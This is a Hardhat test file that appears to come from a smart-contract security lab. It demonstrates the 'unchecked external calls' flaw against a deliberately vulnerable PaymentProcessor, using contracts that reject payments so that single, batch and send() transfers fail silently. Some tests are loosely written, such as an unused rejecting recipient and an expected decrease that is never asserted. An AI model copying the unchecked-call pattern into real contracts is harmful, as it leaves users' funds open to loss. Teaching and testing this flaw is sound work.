const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("SC06: Unchecked External Calls - Payment Processor Exploit", function () {
  let owner, user;
  let vulnerableContract, exploiterContract, maliciousRecipient;

  before(async function () {
    [owner, user] = await ethers.getSigners();

    // Deploy the vulnerable PaymentProcessor contract
    const PaymentProcessor = await ethers.getContractFactory("PaymentProcessor", owner);
    vulnerableContract = await PaymentProcessor.deploy();
    
    console.log("\n[Setup] Vulnerable PaymentProcessor contract deployed");
    
    // Fund the contract
    await owner.sendTransaction({
      to: await vulnerableContract.getAddress(),
      value: ethers.parseEther("10")
    });
    
    const balance = await vulnerableContract.getBalance();
    console.log(`Contract funded with: ${ethers.formatEther(balance)} ETH`);
  });

  it("should demonstrate silent failure when payment is rejected", async function () {
    // Deploy the exploiter contract that will reject payments
    const UncheckedCallExploiter = await ethers.getContractFactory("UncheckedCallExploiter", user);
    const vulnerableContractAddress = await vulnerableContract.getAddress();
    exploiterContract = await UncheckedCallExploiter.deploy(vulnerableContractAddress);
    
    console.log("\n[Attack 1] Sending payment to contract that rejects it...");
    
    const exploiterAddress = await exploiterContract.getAddress();
    const contractBalanceBefore = await vulnerableContract.getBalance();
    const exploiterBalanceBefore = await ethers.provider.getBalance(exploiterAddress);
    
    console.log(`Contract balance before: ${ethers.formatEther(contractBalanceBefore)} ETH`);
    console.log(`Exploiter balance before: ${ethers.formatEther(exploiterBalanceBefore)} ETH`);
    
    // Try to send 1 ETH to the exploiter contract
    // The exploiter will reject it, but the vulnerable contract won't notice
    await vulnerableContract.connect(owner).sendPayment(exploiterAddress, ethers.parseEther("1"));
    
    const contractBalanceAfter = await vulnerableContract.getBalance();
    const exploiterBalanceAfter = await ethers.provider.getBalance(exploiterAddress);
    
    console.log(`Contract balance after: ${ethers.formatEther(contractBalanceAfter)} ETH`);
    console.log(`Exploiter balance after: ${ethers.formatEther(exploiterBalanceAfter)} ETH`);
    
    // Verify the payment failed silently - exploiter didn't receive funds
    expect(exploiterBalanceAfter).to.equal(exploiterBalanceBefore);
    // The contract balance should remain the same (call failed, ETH not sent)
    expect(contractBalanceAfter).to.equal(contractBalanceBefore);
    
    console.log("✓ Attack successful: Payment call failed but no error was thrown!");
  });

  it("should demonstrate batch payment with silent failures", async function () {
    console.log("\n[Attack 2] Batch payment with some failing recipients...");
    
    // Deploy multiple malicious recipients
    const MaliciousRecipient = await ethers.getContractFactory("MaliciousRecipient");
    const goodRecipient = await MaliciousRecipient.deploy(false); // Won't reject
    const badRecipient1 = await MaliciousRecipient.deploy(true);  // Will reject
    const badRecipient2 = await MaliciousRecipient.deploy(true);  // Will reject
    
    const recipients = [
      await goodRecipient.getAddress(),
      await badRecipient1.getAddress(),
      await badRecipient2.getAddress()
    ];
    
    const amounts = [
      ethers.parseEther("0.5"),
      ethers.parseEther("0.5"),
      ethers.parseEther("0.5")
    ];
    
    const contractBalanceBefore = await vulnerableContract.getBalance();
    const goodRecipientBalanceBefore = await ethers.provider.getBalance(recipients[0]);
    
    console.log(`Contract balance before: ${ethers.formatEther(contractBalanceBefore)} ETH`);
    
    // Execute batch payment
    await vulnerableContract.connect(owner).batchPayment(recipients, amounts);
    
    const contractBalanceAfter = await vulnerableContract.getBalance();
    const goodRecipientBalanceAfter = await ethers.provider.getBalance(recipients[0]);
    
    console.log(`Contract balance after: ${ethers.formatEther(contractBalanceAfter)} ETH`);
    console.log(`Good recipient received: ${ethers.formatEther(goodRecipientBalanceAfter - goodRecipientBalanceBefore)} ETH`);
    
    // Only the good recipient should have received funds
    expect(goodRecipientBalanceAfter).to.be.greaterThan(goodRecipientBalanceBefore);
    
    // Contract balance should have decreased by more than what was successfully sent
    const expectedDecrease = ethers.parseEther("1.5"); // All 3 payments deducted
    const actualDecrease = contractBalanceBefore - contractBalanceAfter;
    
    console.log(`Expected decrease: ${ethers.formatEther(expectedDecrease)} ETH`);
    console.log(`Actual decrease: ${ethers.formatEther(actualDecrease)} ETH`);
    
    console.log("✓ Attack successful: 2 out of 3 payments failed silently!");
  });

  it("should demonstrate unchecked send() failure", async function () {
    console.log("\n[Attack 3] Using unchecked send() function...");
    
    // First, the user needs to deposit funds
    await vulnerableContract.connect(user).deposit({ value: ethers.parseEther("2") });
    
    const userBalanceBefore = await vulnerableContract.balances(user.address);
    console.log(`User's recorded balance: ${ethers.formatEther(userBalanceBefore)} ETH`);
    
    // Deploy a recipient that rejects
    const MaliciousRecipient = await ethers.getContractFactory("MaliciousRecipient");
    const rejectingRecipient = await MaliciousRecipient.deploy(true);
    const recipientAddress = await rejectingRecipient.getAddress();
    
    // First deposit some balance for the recipient in the contract
    await vulnerableContract.connect(owner).deposit({ value: ethers.parseEther("1") });
    
    const recipientBalanceBefore = await ethers.provider.getBalance(recipientAddress);
    const contractBalanceBefore = await vulnerableContract.getBalance();
    
    console.log(`Contract balance before: ${ethers.formatEther(contractBalanceBefore)} ETH`);
    
    // Try to withdraw using unchecked send - this should fail silently
    // Note: In Solidity 0.8+, send() still has gas limits and can fail
    // The vulnerability is that we don't check if it succeeded
    await vulnerableContract.connect(owner).withdrawUnchecked(user.address, ethers.parseEther("1"));
    
    const userBalanceAfter = await vulnerableContract.balances(user.address);
    const userActualBalanceAfter = await ethers.provider.getBalance(user.address);
    const contractBalanceAfter = await vulnerableContract.getBalance();
    
    console.log(`User's recorded balance after: ${ethers.formatEther(userBalanceAfter)} ETH`);
    console.log(`Contract balance after: ${ethers.formatEther(contractBalanceAfter)} ETH`);
    
    // The balance was decreased
    expect(userBalanceAfter).to.be.lessThan(userBalanceBefore);
    
    console.log("✓ Attack demonstrated: send() used without checking return value!");
  });

  it("should show the correct way when exploiter accepts payments", async function () {
    console.log("\n[Correct Behavior] When recipient accepts payment...");
    
    // Make the exploiter accept payments
    await exploiterContract.connect(user).setRejectPayments(false);
    
    const exploiterAddress = await exploiterContract.getAddress();
    const exploiterBalanceBefore = await ethers.provider.getBalance(exploiterAddress);
    
    // Send payment again
    await vulnerableContract.connect(owner).sendPayment(exploiterAddress, ethers.parseEther("0.5"));
    
    const exploiterBalanceAfter = await ethers.provider.getBalance(exploiterAddress);
    const received = exploiterBalanceAfter - exploiterBalanceBefore;
    
    console.log(`Exploiter received: ${ethers.formatEther(received)} ETH`);
    
    // This time the payment should succeed
    expect(exploiterBalanceAfter).to.be.greaterThan(exploiterBalanceBefore);
    
    console.log("✓ Payment successful when recipient accepts!");
  });
});
